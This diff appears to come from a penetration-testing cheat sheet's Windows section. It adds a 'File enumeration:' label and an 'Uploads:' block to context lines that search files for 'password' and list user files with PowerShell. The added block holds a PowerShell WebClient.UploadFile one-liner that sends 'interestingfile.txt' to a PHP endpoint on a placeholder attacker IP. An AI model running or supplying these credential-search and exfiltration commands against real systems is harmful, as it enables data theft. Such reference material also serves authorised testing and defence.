@@ -250,8 +250,13 @@ findstr /si password
 
 ### PowerShell
 
+File enumeration:
 ```
 Get-ChildItem -file -recurse -erroraction silentlycontinue
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt'
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' -path c:\users
+```
+Uploads:
+```
+powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'interestingfile.txt')
 ```
